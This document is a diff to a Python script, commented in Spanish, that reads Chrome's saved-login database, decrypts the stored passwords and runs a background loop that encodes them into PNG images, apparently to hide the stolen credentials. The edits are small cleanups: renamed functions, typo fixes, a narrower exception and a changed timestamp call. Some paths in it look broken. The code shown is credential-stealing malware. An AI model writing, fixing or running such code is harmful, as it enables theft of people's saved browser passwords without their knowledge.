@@ -34,7 +34,7 @@ def isvalidformat(msg):
         return False 
 
 #Función que descifra las contraseñas que provienen del navegador
-def decryp_passwords():
+def decrypt_passwords():
     msglist = []
     try:
         chrome_path = path.expanduser("~/.config/google-chorme/Default/Login Data")
@@ -58,7 +58,7 @@ def decryp_passwords():
     return msglist 
 
 # Función que descifra las contraseñas de antiguos navegadores
-def decrypt_passwords():
+def decrypt_passwords2():
     chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
     try:
         f = open(chrome_path, "r")
@@ -74,6 +74,7 @@ def decrypt_passwords():
             elif c == '\n':
              lines.append(s)
              s = ""
+
         f.close()
         r = re.compile('/')
         l1 = r.split(lines[1])
@@ -85,9 +86,9 @@ def decrypt_passwords():
             x.append(l1[5+(i-1)*9])
             x.append(l1[6+(i-1)*9])
             i = i + 1
+
         y = []
         i = 1
-
         while(3+(i-1)*6 < l2.__len__()):
             y.append(l2[3+(i-1)*6])
             i = i + 1
@@ -129,9 +130,9 @@ def decrypt_passwords():
         msglist.append(format_msg(entry))
     return msglist 
 
-# Functión que inicializa la pimera ejecución
+# Función que inicializa la pimera ejecución
 def first_run():
-    msglist = decrypt_passwords() # Listof browser saved passwords
+    msglist = decrypt_passwords() # List of browser saved passwords
     num_of_msgs = msglist.__len__() # No. of browser saved passwords 
     i = -1
 
@@ -189,7 +190,7 @@ while True:
     else:
         try:
             update_dt
-        except:
+        except NameError:
             update_dt = None 
         if update_dt is None:
             f = open('/tmp/bootup.cfg', 'r')
@@ -206,7 +207,7 @@ while True:
             msglist = []
             for infile in glob.glob(encode_dir + "+.png"):
             #print decode(infile)
-                file_cdt = datetime.fromtimestamp(path.getmtime(infile))
+                file_cdt = datetime.fromtimestamp(path.getctime(infile))
 
                 if ((file_cdt - update_dt) > timedelta(0)):
                     msg = decode(infile)
@@ -224,8 +225,4 @@ while True:
                     f.close()
                     if (encodeflg == 1):
                         num_encoded = encode_run(msglist, update_dt)
-            sleep(10)
-
-
-
-
+        sleep(10)
